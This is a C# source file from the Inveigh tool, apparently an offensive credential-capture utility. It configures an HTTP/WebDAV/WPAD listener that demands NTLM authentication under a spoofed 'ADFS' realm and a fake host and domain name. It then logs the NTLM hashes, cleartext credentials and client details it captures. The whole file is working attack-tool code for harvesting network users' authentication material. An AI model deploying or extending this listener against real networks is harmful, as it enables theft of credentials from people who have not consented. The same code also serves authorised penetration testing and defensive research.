using System;

namespace Inveigh
{
    class HTTPListener : Quiddity.HTTPListener
    {

        public HTTPListener()
        {
            this.EnabledWebDAV = true;
            this.IgnoreAgents = new string[] { "Firefox" };
            this.HTTPAuth = "NTLM";
            this.WebDAVAuth = "NTLM";
            this.WPADAuth = "NTLM";
            this.HTTPRealm = "ADFS";
            this.NetbiosDomain = "DESKTOP-TI86FV2";
            this.ComputerName = "DESKTOP-TI86FV2";
            this.DNSDomain = "DESKTOP-TI86FV2";
        }

        protected override void OutputUserAgent(string protocol, string listenerPort, string clientIP, string clientPort, string userAgent)
        {
            Output.Queue(String.Format("[.] [{0}] {1}({2}) user agent from {3}:{4}:{5}{6}", Output.Timestamp(), protocol, listenerPort, clientIP, clientPort, Environment.NewLine, userAgent));
        }

        protected override void OutputHostHeader(string protocol, string listenerPort, string clientIP, string clientPort, string hostHeader)
        {
            Output.Queue(String.Format("[.] [{0}] {1}({2}) host header {3} from {4}:{5}", Output.Timestamp(), protocol, listenerPort, hostHeader, clientIP, clientPort));
        }

        protected override void OutputRequestMethod(string protocol, string listenerPort, string clientIP, string clientPort, string uri, string method)
        {
            Output.Queue(String.Format("[.] [{0}] {1}({2}) {3} request from {5}:{6} for {4}", Output.Timestamp(), protocol, listenerPort, method, uri, clientIP, clientPort));
        }

        protected override void OutputNTLM(string protocol, string listenerPort, string clientIP, string clientPort, string user, string domain, string host, string ntlmChallenge, string ntlmResponseHash, string lmResponseHash)
        {
            Output.NTLMOutput(user, domain, ntlmChallenge, ntlmResponseHash, clientIP, host, protocol, listenerPort, clientPort, lmResponseHash);
        }

        protected override void OutputCleartext(string protocol, string listenerPort, string clientIP, string clientPort, string credentials)
        {
            Output.CleartextOutput(protocol, listenerPort, clientIP, clientPort, credentials);
        }

        protected override void OutputChallenge(string protocol, string listenerPort, string clientIP, string clientPort, string challenge)
        {
            Output.Queue(String.Format("[+] [{0}] {1}({2}) NTLM challenge [{3}] sent to {4}:{5}", Output.Timestamp(), protocol, listenerPort, challenge, clientIP, clientPort));
        }

        protected override void OutputError(Exception ex, string protocol, int port)
        {
            if (ex.Message.ToString().Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
            {
                Output.Queue(string.Format("[!] Failed to start {0} listener on port {1}, check IP and port usage.", protocol, port));
            }
            else
            {
                Output.Queue(ex.ToString());

            }
        }

    }

}
